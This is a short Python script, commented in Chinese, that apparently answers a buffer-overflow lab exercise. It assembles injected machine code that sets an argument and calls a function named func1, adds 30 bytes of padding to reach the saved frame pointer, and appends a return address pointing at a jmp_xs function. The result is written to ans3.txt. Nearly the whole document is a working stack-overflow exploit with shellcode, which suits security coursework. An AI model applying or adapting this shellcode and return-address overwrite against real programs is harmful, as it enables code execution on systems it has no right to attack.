# 完成参数传递并调用func1
instr_seq = b"\x6a\x72\x5f\xb8\x16\x12\x40\x00\xff\xd0"

# 补齐至40字节以覆盖栈缓冲区及保存的rbp
padding = b'A' * 30

# jmp_xs函数地址
jmp_xs_addr = b'\x34\x13\x40\x00\x00\x00\x00\x00'

# 拼接
payload = instr_seq + padding + jmp_xs_addr

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print("payload已保存到ans3.txt")